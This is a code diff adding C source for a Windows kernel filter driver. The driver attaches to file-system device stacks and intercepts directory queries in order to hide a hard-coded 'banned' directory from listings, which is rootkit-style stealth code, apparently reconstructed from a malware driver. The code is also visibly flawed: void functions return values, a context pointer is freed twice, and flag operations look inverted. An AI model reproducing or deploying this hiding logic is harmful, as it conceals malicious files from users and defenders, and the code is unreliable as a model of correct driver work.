@@ -1,0 +1,156 @@
+NTSTATUS FileControlCompletionRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp,PDEVICE_OBJECT* Context)
+{
+  PDEVICE_OBJECT TargetDevice;
+  TargetDevice = ((PDEVICE_EXTENSION)((*Context)->DeviceExtension))->RealDevice->Vpb->DeviceObject;
+  if (Irp->IoStatus.Status != STATUS_SUCCESS)
+  {
+    IoDeleteDevice(DeviceObject);
+    ExFreePoolWithTag(Context,0);
+  }
+  if (IsAllreadyAttached(TargetDevice) == TRUE){
+    IoDeleteDevice(DeviceObject);
+    ExFreePoolWithTag(Context,0);
+    return STATUS_SUCCESS;
+  };
+  if (AttachDelayThread(*Context,TargetDevice) != TRUE){
+    IoDeleteDevice(DeviceObject);
+  };
+  ExFreePoolWithTag(Context,0);
+  return STATUS_SUCCESS;
+};
+
+BOOLEAN AttachDelayThread(PDEVICE_OBJECT DeviceObject,PDEVICE_OBJECT TargetDevice)
+{
+  LARGE_INTEGER Interval;
+  int i;
+  SettingFlags(DeviceObject,TargetDevice);
+  for ( i = 0;i<8 ;i++){
+    if (AttachToStack(DeviceObject,TargetDevice,DeviceObject->DeviceExtension)== TRUE){
+        return TRUE;        
+    };
+    *((ULONG*)((ULONG)&Interval+(ULONG)4)) = -1;
+    *((ULONG*)&Interval) = -5000000;
+    KeDelayExecutionThread(0,FALSE,&Interval);
+  };
+  return FALSE;
+};
+/**-------------------------------------------------------------------
+    Directory Control
+----------------------------------------------------------------------**/
+
+VOID OnDirectoryControl(PDEVICE_OBJECT DeviceObject,PIRP Irp)
+{
+  if (Irp->Tail.Overlay.CurrentStackLocation->MinorFunction == IRP_MN_QUERY_DIRECTORY){
+      SetCompletionDirControl(DeviceObject,Irp);
+  }else{
+    return CallDriver(DeviceObject,Irp);
+  }
+};
+
+VOID SetCompletionDirControl(PDEVICE_OBJECT DeviceObject,PIRP Irp)
+{
+  PUNICODE_STRING Filename;
+  PIO_STACK_LOCATION CurrentStack;
+  PIO_STACK_LOCATION PrevStack;
+  PIO_STACK_LOCATION PrevIrpStack;
+  int i;
+  CurrentStack = Irp->Tail.Overlay.CurrentStackLocation;
+  if (!(CurrentStack->FileObject->Flags & 0x400000) && CurrentStack->FileObject != 0){
+    Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.FileName = 0; //Clear Filename
+    if (CurrentStack->FileObject != 0)CurrentStack->FileObject->Flags &= 0x400000;
+    CallDriver(DeviceObject,Irp);
+  }
+  Filename = CurrentStack->Parameters.QueryDirectory.FileName;
+  if (Filename != 0 && Filename->Length == 0x4C /*The Size of BannedDirectory*/ ){
+      for (i =0;i< 19; i++)
+      {
+          if ((ULONG)BannedDirecoty[i] == (ULONG)Filename->Buffer[i]){
+              goto Error;
+          };
+      };
+      goto Inject;
+Error:
+  
+    CurrentStack->Parameters.QueryDirectory.FileName = 0; //Clear Filename
+    if (Irp->Tail.Overlay.CurrentStackLocation->FileObject != 0)Irp->Tail.Overlay.CurrentStackLocation->FileObject->Flags &= 0x400000;
+    CallDriver(DeviceObject,Irp);
+    return;
+  }; 
+  
+Inject:
+  
+  CurrentStack->Control=1;
+  PrevStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
+  
+  for (i = 0;i<8;i++){
+    PrevStack[i]=CurrentStack[i];
+  };
+  PrevIrpStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation - (ULONG)sizeof(IO_STACK_LOCATION));
+  PrevIrpStack->Control = 0;
+  PrevIrpStack->Context = 0;
+  PrevIrpStack->CompletionRoutine = DirectoryCompletionRoutine;
+  PrevIrpStack->Control=0xE0;
+  return IoCallDriver(((PDEVICE_EXTENSION)(DeviceObject->DeviceExtension))->AttachedDevice,Irp);
+};
+
+
+NTSTATUS DirectoryCompletionRoutine(PDEVICE_OBJECT DeviceObject,PIRP Irp,PDEVICE_OBJECT* Context)
+{
+  ULONG EndOfFile;
+  ULONG FilenameOffset;
+  ULONG LclContext;
+  ULONG FilenameLength;
+  PVOID mmFiles;
+  LclContext = (ULONG)Context;
+  if (Irp->IoStatus.Status != STATUS_SUCCESS){
+    FreeMdl(Irp,LclContext);
+    return 0;
+  };
+  if (GetOffsets(Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.FileInformationClass, \
+                              &EndOfFile,&FilenameOffset,&FilenameLength) == 0){
+    FreeMdl(Irp,LclContext);
+    return 0;
+  };
+  if (Irp->MdlAddress != 0){
+    if (Irp->MdlAddress->MdlFlags  == 5){
+      //maps the physical pages that are described by The MDL to a virtual address
+      mmFiles=MmMapLockedPagesSpecifyCache(Irp->MdlAddress,0,MmCached,0,0,0x10);
+      if (mmFiles == 0){
+        FreeMdl(Irp,LclContext);
+        return 0;
+      };
+    }else if (Irp->MdlAddress->MappedSystemVa == 0){
+      FreeMdl(Irp,LclContext);
+      return 0;  
+    };
+  }else{
+    mmFiles=Irp->UserBuffer;
+  };
+  if (FileCheck(mmFiles,Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.Length, \
+                            EndOfFile,FilenameOffset,FilenameLength) != 0){
+    Irp->IoStatus.Status = STATUS_SUCCESS;
+    FreeMdl(Irp,Context);
+    return 0;
+  };
+  if (Irp->MdlAddress == 0){
+      LclContext = ExAllocatePool(0,4);
+      if (LclContext == 0 || AllocateMdl(LclContext,Irp,Irp->Tail.Overlay.CurrentStackLocation) == 0){
+        FreeMdl(Irp,LclContext);
+        Irp->IoStatus.Status=0x0C000009A;
+        return 0;  
+      };
+  };
+   Irp->IoStatus.Status = CreateWorkRoutine(DeviceObject,Irp->Tail.Overlay.CurrentStackLocation,Irp,LclContext);
+   return;
+};
+
+VOID FreeMdl(PIRP Irp,PMDL* Context)
+{
+  if (Irp->MdlAddress == *Context){
+       Irp->MdlAddress=0;
+       MmUnlockPages((PMDL)*Context);
+       IoFreeMdl(*Context);
+  };
+  ExFreePoolWithTag(*Context,0);
+  
+};
